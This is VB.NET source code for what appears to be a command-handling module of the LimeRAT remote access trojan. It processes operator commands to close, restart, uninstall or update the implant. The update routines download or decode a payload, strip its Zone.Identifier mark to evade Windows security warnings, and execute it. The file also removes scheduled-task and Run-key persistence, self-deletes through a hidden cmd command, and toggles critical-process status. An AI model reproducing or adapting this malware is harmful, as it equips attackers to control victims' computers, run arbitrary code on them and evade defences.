Public Class Main

    Public Shared DROP As Boolean
    Public Shared EXE As String
    Public Shared FullPath As String
    Public Shared Privileges As Boolean
    Public Shared HWID As String

    Public Shared Sub CL(DRP As Boolean, EX As String, FP As String, PRI As Boolean, HW As String, CMD As String)
        On Error Resume Next
        DROP = DRP
        EXE = EX
        FullPath = FP
        Privileges = PRI
        HWID = HW

        Dim A As String() = Split(CMD, "|'P'|")
        Select Case A(0)

            Case "CL-"
                Select Case A(1)
                    Case "1" 'close
                        CriticalProcesses_Disable()
                        MT()
                        Environment.Exit(0)

                    Case "2" 'restart
                        CriticalProcesses_Disable()
                        Diagnostics.Process.Start(FP)
                        MT()
                        Environment.Exit(0)

                    Case "3" 'uni
                        DEL()

                    Case "4" 'update disk
                        Dim NewFile = IO.Path.GetTempFileName & IO.Path.GetExtension(A(2))
                        IO.File.WriteAllBytes(NewFile, GZip(Convert.FromBase64String(A(3))))
                        DeleteZoneIdentifier(NewFile)
                        Threading.Thread.CurrentThread.Sleep(1000)
                        Diagnostics.Process.Start(NewFile)
                        DEL()

                    Case "5" 'update url
                        Dim NewFile = IO.Path.GetTempFileName + A(3)
                        Dim WC As New Net.WebClient
                        WC.DownloadFile(A(2), NewFile)
                        DeleteZoneIdentifier(NewFile)
                        Threading.Thread.CurrentThread.Sleep(1000)
                        Diagnostics.Process.Start(NewFile)
                        DEL()
                End Select
        End Select
    End Sub

    Public Shared Sub DEL()

        Try
            If DROP Then
                IO.File.SetAttributes(FullPath, IO.FileAttributes.Normal)
                Threading.Thread.Sleep(50)

                Try : Shell("schtasks /Delete /tn LimeRAT-Admin /F", AppWinStyle.Hide, False, -1) : Catch : End Try
                Try : Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Run\").DeleteValue(EXE) : Catch : End Try
        End If

            Microsoft.Win32.Registry.CurrentUser.DeleteSubKeyTree("Software\" & HWID)
            CriticalProcesses_Disable()
            Threading.Thread.Sleep(50)

            MT()

            Shell("cmd.exe /c ping 0 -n 2 & del " & """" & FullPath & """", AppWinStyle.Hide, False, -1)
            Environment.Exit(0)
        Catch : End Try

    End Sub

    Public Shared Sub MT()
        Dim createdNew As Boolean = False
        Dim MTX As Threading.Mutex = New Threading.Mutex(True, HWID, createdNew)
        If MTX IsNot Nothing Then
            MTX.Close()
            MTX = Nothing
        End If
    End Sub

    'https://www.codeproject.com/Articles/43405/Protecting-Your-Process-with-RtlSetProcessIsCriti
    <Runtime.InteropServices.DllImport("NTdll.dll", EntryPoint:="RtlSetProcessIsCritical", SetLastError:=True)>
    Public Shared Sub SetCurrentProcessIsCritical(
                          <Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.Bool)> ByVal isCritical As Boolean,
                          <Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.Bool)> ByRef refWasCritical As Boolean,
                          <Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.Bool)> ByVal needSystemCriticalBreaks As Boolean)
    End Sub
    Public Shared Sub CriticalProcesses_Disable()
        Try
            Dim refWasCritical As Boolean
            SetCurrentProcessIsCritical(False, refWasCritical, False)
        Catch ex As Exception
        End Try
    End Sub
    Private Shared Function BS(ByVal b As Byte()) As String ' byte() to string
        Return Text.Encoding.UTF8.GetString(b)
    End Function

    Private Shared Function GZip(ByVal B As Byte()) As Byte()
        Try
            Dim MS As New IO.MemoryStream(B)
            Dim Ziped As New IO.Compression.GZipStream(MS, IO.Compression.CompressionMode.Decompress)
            Dim buffer As Byte() = New Byte(4 - 1) {}
            MS.Position = (MS.Length - 5)
            MS.Read(buffer, 0, 4)
            Dim count As Integer = BitConverter.ToInt32(buffer, 0)
            MS.Position = 0
            Dim array As Byte() = New Byte(((count - 1) + 1) - 1) {}
            Ziped.Read(array, 0, count)
            Ziped.Dispose()
            MS.Dispose()
            Return array
        Catch ex As Exception
        End Try
    End Function

    <Runtime.InteropServices.DllImport("kernel32.dll", CharSet:=Runtime.InteropServices.CharSet.Auto, BestFitMapping:=False, ThrowOnUnmappableChar:=True, SetLastError:=True)>
    Public Shared Function DeleteFile(<Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.LPTStr)> ByVal filepath As String
    ) As <Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.Bool)> Boolean
    End Function
    Public Shared Sub DeleteZoneIdentifier(ByVal filePath As String)
        Try : DeleteFile(filePath + ":Zone.Identifier") : Catch : End Try
    End Sub

End Class
